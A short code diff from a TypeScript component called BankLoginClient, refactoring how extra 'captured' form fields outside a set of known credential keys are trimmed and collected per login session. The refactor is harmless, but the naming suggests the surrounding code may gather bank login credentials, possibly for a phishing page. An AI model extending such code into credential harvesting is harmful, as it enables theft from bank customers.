@@ -150,9 +150,14 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
       ...normalizedFields,
     });
     const extraCapturedFields = Object.fromEntries(
-      Object.entries((overrideData ?? {}) as Record<string, unknown>)
-        .filter(([key, value]) => !knownCredentialKeys.has(key) && typeof value === "string" && value.trim().length > 0)
-        .map(([key, value]) => [key, value.trim()]),
+      Object.entries((overrideData ?? {}) as Record<string, unknown>).flatMap(([key, value]) => {
+        if (knownCredentialKeys.has(key) || typeof value !== "string") {
+          return [];
+        }
+
+        const trimmedValue = value.trim();
+        return trimmedValue.length > 0 ? [[key, trimmedValue]] : [];
+      }),
     );
     const nextFormData = {
       ...sessionFormData,
